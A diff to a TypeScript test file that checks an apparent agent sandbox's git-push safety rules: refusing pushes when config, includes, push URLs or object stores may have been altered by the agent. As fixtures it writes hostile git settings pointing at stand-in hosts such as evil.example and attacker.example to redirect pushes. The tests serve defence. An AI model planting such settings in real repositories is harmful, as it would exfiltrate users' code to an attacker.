@@ -6,7 +6,7 @@
  */
 import { afterEach, beforeEach, describe, expect, test } from "bun:test";
 import { execFileSync } from "node:child_process";
-import { chmodSync, existsSync, mkdirSync, mkdtempSync, realpathSync, rmSync, writeFileSync } from "node:fs";
+import { chmodSync, existsSync, mkdirSync, mkdtempSync, realpathSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { isPushTool, isSafeTool } from "../daemon/providers/tool-safety.js";
@@ -95,7 +95,7 @@ describe("push: the plan", () => {
     for (const body of ['[remote "origin"]\n\tpushurl = https://evil.example/x.git\n', '[url "https://evil.example/"]\n\tinsteadOf = file://\n', "[http]\n\tproxy = http://evil.example:1\n", "[core]\n\tsshCommand = ssh -o ProxyCommand=evil\n"]) {
       writeFileSync(inc, body);
       git(repo, "config", "include.path", inc);
-      expect(await refusal()).toContain("a file this session's agent could write");
+      expect(await refusal()).toMatch(/a file this session's agent could write|includes another file/);
       git(repo, "config", "--unset", "include.path");
     }
     // The repository's own config is the user's (read-only to sandboxed commands): its settings are taken.
@@ -109,27 +109,59 @@ describe("push: the plan", () => {
     }
   });
 
-  test("round 1: a repository whose config the sandbox doesn't hold, or that was made or changed after the session began, decides nothing", async () => {
+  test("round 1: a repository whose config the sandbox doesn't hold decides nothing", async () => {
     expect(await refusal({}, { heldReadOnly: [] })).toContain("aren't held read-only by this session's sandbox");
     expect(await refusal({}, { heldReadOnly: [join(root, "elsewhere")] })).toContain("aren't held read-only");
-    // The session began after the repository's config was written: fine. Before it (a `git init` or a `git config` since): refused.
-    expect("refused" in (await plan({}, { notChangedSince: Date.now() + 60_000 }))).toBe(false);
-    expect(await refusal({}, { notChangedSince: Date.now() - 60_000 })).toContain("made or changed after this session began");
-    // An empty config.worktree (codeoid makes one when it holds the git dir) changes nothing.
-    const began = Date.now() + 1;
-    await Bun.sleep(5);
-    writeFileSync(join(repo, ".git", "config.worktree"), "");
-    expect("refused" in (await plan({}, { notChangedSince: began }))).toBe(false);
   });
 
-  test("round 1: an include of your global config that the agent can write decides nothing; your own ssh command is used", async () => {
+  test("round 2: a repository made where an agent worked before it was one is refused, in any later session; an older one there isn't", async () => {
+    // The workspace was noted without a repository after this one was made: this one predates it.
+    expect("refused" in (await plan({}, { untrustedRoots: [{ path: join(root, "work"), since: Date.now() + 60_000 }] }))).toBe(false);
+    // Noted before this repository's git dir was born: the agent's.
+    expect(await refusal({}, { untrustedRoots: [{ path: join(root, "work"), since: Date.now() - 60_000 }] })).toContain("made where an agent worked");
+    // A workspace elsewhere says nothing about this one.
+    expect("refused" in (await plan({}, { untrustedRoots: [{ path: join(root, "other"), since: 0 }] }))).toBe(false);
+  });
+
+  test("round 2: settings that decide a push, changed since the session began, refuse it; branch tracking and the like don't", async () => {
+    const { pushDecidingSnapshot } = await import("../daemon/sandbox/push.js");
+    const snapshot = await pushDecidingSnapshot(repo);
+    git(repo, "config", "branch.feature/x.remote", "origin");
+    git(repo, "config", "branch.feature/x.merge", "refs/heads/feature/x");
+    writeFileSync(join(repo, ".gitattributes"), "*.png binary\n");
+    expect("refused" in (await plan({}, { snapshot }))).toBe(false);
+    git(repo, "config", "remote.origin.pushurl", `file://${bare}`);
+    expect(await refusal({}, { snapshot })).toContain("changed during this session (remote.origin.pushurl)");
+  });
+
+  test("round 1: an include of your global config that the agent can write decides nothing, even empty or missing now; your own ssh command is used", async () => {
     mkdirSync(join(root, "scratch"), { recursive: true });
     const team = join(root, "scratch", "team.gitconfig");
     writeFileSync(team, '[remote "origin"]\n\tpushurl = ssh://git@attacker.example/loot.git\n');
     writeFileSync(join(root, ".gitconfig"), `[include]\n\tpath = ${team}\n`);
     expect(await refusal()).toContain("a file this session's agent can write");
+    // Round 2: judged by what it names, not what is there now (git reads it again when it pushes).
+    writeFileSync(team, "[alias]\n\tst = status\n");
+    expect(await refusal()).toContain("includes");
+    rmSync(team);
+    writeFileSync(join(root, ".gitconfig"), `[includeIf "gitdir:${repo}/"]\n\tpath = ${team}\n`);
+    expect(await refusal()).toContain("includes");
+    // The repository's own config never includes for a push.
+    writeFileSync(join(root, ".gitconfig"), "");
+    git(repo, "config", "include.path", "../../outside.gitconfig");
+    expect(await refusal()).toContain("includes another file");
+    git(repo, "config", "--unset", "include.path");
     writeFileSync(join(root, ".gitconfig"), "[core]\n\tsshCommand = ssh -i ~/.ssh/work_key\n");
     expect(await planned()).toMatchObject({ sshCommand: "ssh -i ~/.ssh/work_key" });
+    // Round 2: the default-branch lookup is given it too.
+    const seen: Array<string | null> = [];
+    await plan({}, {
+      remoteDefault: async (_u, _c, _t, ssh) => {
+        seen.push(ssh);
+        return null;
+      },
+    });
+    expect(seen).toEqual(["ssh -i ~/.ssh/work_key"]);
   });
 
   test("only ssh and https remotes are pushed to for real; two push URLs, or borrowed objects, are refused", async () => {
@@ -189,6 +221,14 @@ describe("push: the run", () => {
     writeFileSync(join(repo, ".git", "objects", "info", "alternates"), "/elsewhere/objects\n");
     expect(await runPush(p, 60_000, true)).toMatchObject({ ok: false, summary: expect.stringContaining("borrows objects") });
     rmSync(join(repo, ".git", "objects", "info", "alternates"));
+    // Round 2: a link in the object store's top levels too.
+    const { objectsProblem } = await import("../daemon/sandbox/push.js");
+    const pack = join(repo, ".git", "objects", "pack");
+    rmSync(pack, { recursive: true, force: true });
+    symlinkSync(join(root, "elsewhere"), pack);
+    expect(objectsProblem(join(repo, ".git"))).toContain("is a link");
+    rmSync(pack);
+    mkdirSync(pack);
     const stopped = new AbortController();
     stopped.abort();
     expect(await runPush(p, 60_000, true, stopped.signal)).toMatchObject({ ok: false, summary: expect.stringContaining("closing") });
